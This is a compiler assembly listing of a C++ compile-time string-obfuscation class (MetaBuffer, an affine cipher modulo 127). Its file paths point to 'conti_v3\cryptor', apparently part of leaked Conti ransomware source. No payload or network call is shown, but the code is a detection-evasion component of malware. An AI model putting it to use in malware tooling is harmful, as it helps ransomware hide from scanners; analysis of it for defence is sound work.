; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00257	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0025b	88 85 c0 00 00
	00		 mov	 BYTE PTR tv189[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00261	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00268	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0026f	5f		 pop	 rdi
  00270	5d		 pop	 rbp
  00271	c3		 ret	 0
??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<7,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	ff c8		 dec	 eax
  0002c	6b c0 0f	 imul	 eax, eax, 15
  0002f	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00034	8b c8		 mov	 ecx, eax
  00036	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00042	5f		 pop	 rdi
  00043	5d		 pop	 rbp
  00044	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 11	 imul	 eax, eax, 17
  0002d	ff c0		 inc	 eax
  0002f	99		 cdq
  00030	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00035	f7 f9		 idiv	 ecx
  00037	8b c2		 mov	 eax, edx

; 76   :     }

  00039	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00040	5f		 pop	 rdi
  00041	5d		 pop	 rbp
  00042	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1a	 cmp	 QWORD PTR i$1[rbp], 26
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,1,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
